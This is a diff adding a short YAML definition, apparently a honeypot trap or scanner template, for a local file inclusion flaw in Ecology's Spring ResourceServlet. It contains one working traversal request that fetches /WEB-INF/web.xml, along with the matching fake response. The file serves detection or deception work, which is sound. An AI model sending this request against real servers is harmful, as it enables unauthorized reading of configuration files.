@@ -1,0 +1,23 @@
+id: ecology-springframework-directory-traversal
+info:
+  name: Ecology Springframework - Local File Inclusion
+  author: princechaddha
+  description: Ecology Springframework is vulnerable to local file inclusion.
+  severity: high
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: ecology,springframework,lfi
+traps:
+- request:
+    method: GET
+    path: /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: <url-pattern>/weaver/
